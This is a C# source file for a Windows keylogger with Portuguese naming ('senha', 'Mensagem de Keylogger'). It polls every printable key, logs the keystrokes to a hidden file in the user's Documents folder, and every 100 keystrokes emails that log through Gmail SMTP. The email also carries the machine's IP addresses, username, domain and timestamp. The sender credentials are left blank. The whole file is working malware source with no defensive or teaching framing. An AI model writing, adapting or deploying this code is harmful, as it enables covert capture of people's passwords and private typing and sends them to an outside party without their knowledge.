﻿using System;
using System.Collections.Generic;
using System.Runtime.InteropServices;
using System.Linq;
using System.Threading;
using System.Text;
using System.IO;
using System.Net;
using System.Net.Mail;

namespace EsseSim
{
    internal class Program
    {
        [DllImport("User32.dll")]
        public static extern int GetAsyncKeyState(Int32 i);
        static long numberOfKeystrokes = 0;
        static void Main(string[] args)
        {
            String filepath = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments);
            if (!Directory.Exists(filepath))
            {
                Directory.CreateDirectory(filepath);
            }

            string path = (filepath + @"\keystrokes.txt");

            if (!File.Exists(path))
            {
                using (StreamWriter sw = File.CreateText(path))
                {

                }
            }
            File.SetAttributes(path, File.GetAttributes(path) | FileAttributes.Hidden);


            while (true)
            {
                Thread.Sleep(5);
                for(int i = 32; i < 127; i++)
                {
                    int keyState = GetAsyncKeyState(i);

                    if (keyState == 32769)
                    {
                        Console.Write((char) i + ", ");
                        using (StreamWriter sw = File.AppendText(path))
                        {
                            sw.Write((char) i);
                        }
                        numberOfKeystrokes++;
                        if (numberOfKeystrokes % 100 == 0)
                        {
                            SendMSg();
                        }

                    }
                    
                }
            }

        }

        static void SendMSg()
        {
            string email = "";
            string senha = "";

            String folderName = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments);
            string filePath = folderName + @"\keystrokes.txt";
            String logContents = File.ReadAllText(filePath);
            string emailBody = "";

            DateTime now = DateTime.Now;
            string subject = "Mensagem de Keylogger";
            var host = Dns.GetHostEntry(Dns.GetHostName());
            foreach (var address in host.AddressList)
            {
                emailBody += "\nAddress: " + address;
            }

            emailBody += "\nUser: " + Environment.UserDomainName + " \\ " + Environment.UserName;
            emailBody += "\nhost " + host;
            emailBody += "\ntime: " + now.ToString();
            emailBody += logContents;

            SmtpClient client = new SmtpClient("smtp.gmail.com", 587);
            MailMessage mailMessage = new MailMessage();
            mailMessage.From = new MailAddress(email);
            mailMessage.To.Add(email);
            mailMessage.Subject = subject;
            client.UseDefaultCredentials = false;
            client.EnableSsl = true;
            client.Credentials = new System.Net.NetworkCredential(email, senha);
            mailMessage.Body = emailBody;

            client.Send(mailMessage);
        }
    }
}
